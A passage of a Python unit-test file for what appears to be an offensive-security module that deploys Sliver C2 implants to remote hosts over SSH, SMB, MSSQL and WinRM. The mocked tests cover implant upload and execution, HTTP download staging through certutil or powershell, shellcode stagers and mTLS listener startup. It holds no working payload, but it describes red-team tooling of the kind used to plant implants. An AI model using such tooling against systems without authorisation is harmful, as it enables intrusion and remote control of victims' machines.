        module_instance._cleanup_local_temp = deps["cleanup_local"]
        module_instance._run_beacon_staged_http = deps["run_staged_http"]
        module_instance._get_worker_and_connect = deps["get_worker"]
        module_instance._generate_sliver_stager = deps["generate_stager"]
        module_instance._worker_submit = deps["worker_submit"]

        return deps

    def test_config_path_none_raises_error(self, module_instance, mock_context, mock_connection):
        """Test _run_beacon raises ModuleExecutionError when config_path is None."""
        module_instance.config_path = None

        with pytest.raises(ModuleExecutionError, match="Sliver config_path not set"):
            module_instance._run_beacon(mock_context, mock_connection)

        mock_context.log.fail.assert_called_once_with(
            "Sliver config_path not set. Ensure options() is called before running the module."
        )

    def test_staging_none_uploads_and_executes(
        self, module_instance, mock_context, mock_connection, mock_run_beacon_deps
    ):
        """Test staging_mode=None performs default upload and execute."""
        module_instance.staging_mode = None
        module_instance.cleanup_mode = "always"
        module_instance.profile = None
        mock_connection.__class__.__name__ = "ssh"
        mock_run_beacon_deps["detect_os_arch"].return_value = ("linux", "amd64")

        mock_handler = Mock()
        mock_handler.get_remote_paths.return_value = ("/tmp/implant", None)
        mock_run_beacon_deps["get_handler"].return_value = mock_handler

        module_instance._run_beacon(mock_context, mock_connection)

        # Verify default flow
        mock_run_beacon_deps["detect_os_arch"].assert_called_once_with(mock_context, mock_connection)
        mock_run_beacon_deps["generate_implant_name"].assert_called_once()
        mock_run_beacon_deps["build_ic_default"].assert_called_once_with(
            mock_context, "linux", "amd64", "test_implant.exe"
        )
        mock_run_beacon_deps["generate_implant"].assert_called_once_with(
            mock_context, "linux", "amd64", "test_implant.exe"
        )
        mock_run_beacon_deps["save_temp"].assert_called_once_with(b"implant_bytes")
        mock_handler.get_remote_paths.assert_called_once_with("linux", "test_implant.exe")
        mock_handler.upload.assert_called_once_with(
            mock_context, mock_connection, "/tmp/test_implant.exe", "/tmp/implant"
        )
        mock_handler.execute.assert_called_once_with(mock_context, mock_connection, "/tmp/implant", "linux")
        mock_run_beacon_deps["wait_cleanup"].assert_called_once()
        mock_run_beacon_deps["cleanup_local"].assert_called_once_with("/tmp/test_implant.exe")

    def test_staging_download_calls_run_beacon_staged_http(
        self, module_instance, mock_context, mock_connection, mock_run_beacon_deps
    ):
        """Test staging_mode='download' calls _run_beacon_staged_http."""
        module_instance.staging_mode = "download"
        module_instance.download_tool = "certutil"
        module_instance.profile = None
        mock_connection.__class__.__name__ = "mssql"

        mock_handler = Mock()
        mock_run_beacon_deps["get_handler"].return_value = mock_handler

        module_instance._run_beacon(mock_context, mock_connection)

        # Verify HTTP staging flow
        mock_context.log.display.assert_any_call("Using HTTP download staging (certutil)")
        mock_run_beacon_deps["run_staged_http"].assert_called_once_with(
            mock_context, mock_connection, "windows", "amd64", "test_implant.exe", mock_handler
        )
        mock_run_beacon_deps["wait_cleanup"].assert_called_once_with(
            mock_context,
            mock_connection,
            "/remote/path",
            "windows",
            "test_implant.exe",
            mock_handler,
            "mssql",
            cleanup_mode=module_instance.cleanup_mode,
            listener_job_id="job_123",
            website_name="site_456",
        )
        # No local cleanup in finally block for staging mode
        mock_run_beacon_deps["cleanup_local"].assert_not_called()

    def test_staging_shellcode_on_winrm_starts_listeners(
        self, module_instance, mock_context, mock_connection, mock_run_beacon_deps
    ):
        """Test staging_mode='shellcode' on WinRM starts stager and mTLS listeners."""
        module_instance.staging_mode = "shellcode"
        module_instance.shellcode_protocol = "http"
        module_instance.shellcode_listener_host = "10.0.0.1"
        module_instance.shellcode_listener_port = 8080
        module_instance.rhost = "10.0.0.1"
        module_instance.rport = 443
        module_instance.mtls_port = 443
        module_instance.profile = None
        mock_connection.__class__.__name__ = "winrm"

        mock_handler = Mock()
        mock_handler.stage_execute.return_value = True
        mock_run_beacon_deps["get_handler"].return_value = mock_handler

        module_instance._run_beacon(mock_context, mock_connection)

        # Verify shellcode staging flow
        mock_run_beacon_deps["get_worker"].assert_called()
        mock_run_beacon_deps["build_ic_default"].assert_called_once()
        mock_run_beacon_deps["generate_stager"].assert_called_once_with(
            mock_context, "windows", "amd64", "test_implant.exe", "default_profile"
        )

        # Verify stager listener started
        assert mock_run_beacon_deps["worker_submit"].call_count >= 2
        mock_run_beacon_deps["worker_submit"].assert_any_call(
            "start_stager_listener", "10.0.0.1", 8080, "http", "default_profile", b"stager_data"
        )
        mock_context.log.info.assert_any_call("Started HTTP stager listener on 10.0.0.1:8080")

        # Verify mTLS listener started
        mock_run_beacon_deps["worker_submit"].assert_any_call("start_mtls_listener", "10.0.0.1", 443)
        mock_context.log.info.assert_any_call("Started mTLS C2 listener for stage 2 on 10.0.0.1:443")

        # Verify stager executed
        mock_handler.stage_execute.assert_called_once_with(mock_context, mock_connection, "windows", b"stager_data")
        mock_context.log.info.assert_any_call(f"Stager executed on {mock_connection.host} via winrm (multi-stage HTTP)")

    def test_staging_shellcode_on_non_winrm_raises_error(
        self, module_instance, mock_context, mock_connection, mock_run_beacon_deps
    ):
        """Test staging_mode='shellcode' on non-WinRM protocol raises ModuleExecutionError."""
        module_instance.staging_mode = "shellcode"
        module_instance.profile = None
        mock_connection.__class__.__name__ = "ssh"

        mock_handler = Mock()
        mock_run_beacon_deps["get_handler"].return_value = mock_handler

        with pytest.raises(ModuleExecutionError, match="Shellcode staging only supported on WinRM"):
            module_instance._run_beacon(mock_context, mock_connection)

        mock_context.log.fail.assert_called_once_with("Shellcode staging currently only supported on WinRM")

    def test_mssql_protocol_auto_enables_download_staging(
        self, module_instance, mock_context, mock_connection, mock_run_beacon_deps
    ):
        """Test MSSQL protocol auto-enables HTTP download staging with certutil."""
        module_instance.staging_mode = None
        module_instance.download_tool = None
        module_instance.http_staging_port = None
        module_instance.profile = None
        mock_connection.__class__.__name__ = "mssql"

        mock_handler = Mock()
        mock_run_beacon_deps["get_handler"].return_value = mock_handler

        module_instance._run_beacon(mock_context, mock_connection)

        # Verify auto-configuration
        assert module_instance.staging_mode == "download"
        assert module_instance.http_staging_port == 8080
        assert module_instance.download_tool == "certutil"
        mock_run_beacon_deps["run_staged_http"].assert_called_once()

    def test_smb_windows_auto_enables_download_staging(
        self, module_instance, mock_context, mock_connection, mock_run_beacon_deps
    ):
        """Test SMB + Windows auto-enables HTTP download staging with powershell."""
        module_instance.staging_mode = None
        module_instance.download_tool = None
        module_instance.http_staging_port = None
        module_instance.profile = None
        mock_connection.__class__.__name__ = "smb"
        mock_run_beacon_deps["detect_os_arch"].return_value = ("windows", "amd64")

        mock_handler = Mock()
        mock_run_beacon_deps["get_handler"].return_value = mock_handler

        module_instance._run_beacon(mock_context, mock_connection)

        # Verify auto-configuration
        assert module_instance.staging_mode == "download"
        assert module_instance.http_staging_port == 8080
        assert module_instance.download_tool == "powershell"
        mock_run_beacon_deps["run_staged_http"].assert_called_once()

    def test_staging_mode_none_explicit_disables_auto_staging(
        self, module_instance, mock_context, mock_connection, mock_run_beacon_deps
    ):
        """Test staging_mode='none' (explicit) disables auto-staging for MSSQL."""
        module_instance.staging_mode = "none"
        module_instance.profile = None
        mock_connection.__class__.__name__ = "mssql"

        mock_handler = Mock()
        mock_handler.get_remote_paths.return_value = ("/remote/implant.exe", None)
        mock_run_beacon_deps["get_handler"].return_value = mock_handler

        module_instance._run_beacon(mock_context, mock_connection)

        # Verify auto-staging was NOT enabled (stayed 'none')
        assert module_instance.staging_mode == "none"
        mock_run_beacon_deps["run_staged_http"].assert_not_called()
        # Should use default upload/execute flow
        mock_handler.upload.assert_called_once()
        mock_handler.execute.assert_called_once()

    def test_cleanup_called_with_correct_params(
        self, module_instance, mock_context, mock_connection, mock_run_beacon_deps
    ):
        """Test _wait_for_beacon_and_cleanup called with correct parameters."""
        module_instance.staging_mode = None
        module_instance.cleanup_mode = "success"
        module_instance.profile = None
        mock_connection.__class__.__name__ = "ssh"

        mock_handler = Mock()
        mock_handler.get_remote_paths.return_value = ("/tmp/implant", None)
        mock_run_beacon_deps["get_handler"].return_value = mock_handler
        mock_run_beacon_deps["detect_os_arch"].return_value = ("linux", "amd64")

        module_instance._run_beacon(mock_context, mock_connection)

        # Verify cleanup called with correct args
        mock_run_beacon_deps["wait_cleanup"].assert_called_once_with(
            mock_context,
            mock_connection,
            "/tmp/implant",
            "linux",
            "test_implant.exe",
            mock_handler,
            "ssh",
            cleanup_mode="success",
            listener_job_id=None,
            website_name=None,
        )

    def test_finally_block_cleans_local_temp_only_when_staging_none(
        self, module_instance, mock_context, mock_connection, mock_run_beacon_deps
    ):
        """Test finally block only cleans local temp file when staging_mode is None."""
        module_instance.staging_mode = None
        module_instance.local_implant_path = "/tmp/test_implant.exe"
        module_instance.profile = None
        mock_connection.__class__.__name__ = "ssh"
        mock_run_beacon_deps["detect_os_arch"].return_value = ("linux", "amd64")

        mock_handler = Mock()
        mock_handler.get_remote_paths.return_value = ("/tmp/implant", None)
        mock_run_beacon_deps["get_handler"].return_value = mock_handler

        module_instance._run_beacon(mock_context, mock_connection)

        # Verify local cleanup called in finally block
        mock_run_beacon_deps["cleanup_local"].assert_called_once_with("/tmp/test_implant.exe")
